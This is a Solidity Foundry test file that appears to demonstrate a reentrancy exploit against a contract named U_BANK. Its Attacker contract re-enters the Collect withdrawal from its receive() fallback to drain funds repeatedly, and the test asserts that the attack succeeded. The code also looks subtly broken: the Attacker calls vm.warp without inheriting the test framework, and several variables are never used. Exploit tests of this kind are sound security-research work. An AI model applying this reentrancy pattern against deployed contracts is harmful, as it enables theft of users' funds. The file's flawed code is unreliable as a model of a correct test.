
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {U_BANK} from "../src/U_BANK.sol";
import {Log} from "../src/Log.sol";

contract TestReentrancyU_BANK is Test {
    U_BANK public _contractUnderTest;
    Log public _logContract;
    
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new U_BANK(address(_logContract));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);
        vm.assume(attackVal * 2 >= 2 ether);

        _logContract = new Log();
        _contractUnderTest = new U_BANK(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        
        uint256 initialVictimBalance = address(_contractUnderTest).balance;
        uint256 initialAttackerBalance = address(_attacker).balance;
        
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = U_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        require(msg.value == val * 2, "Incorrect deposit amount");
        _victim.Put{value: val * 2}(1);
        
        vm.warp(2);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        
        _victim.Collect(val);
        
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            if (attackCallCount < 2) {
                _victim.Collect(storedAttackVal);
            }
        }
    }
}
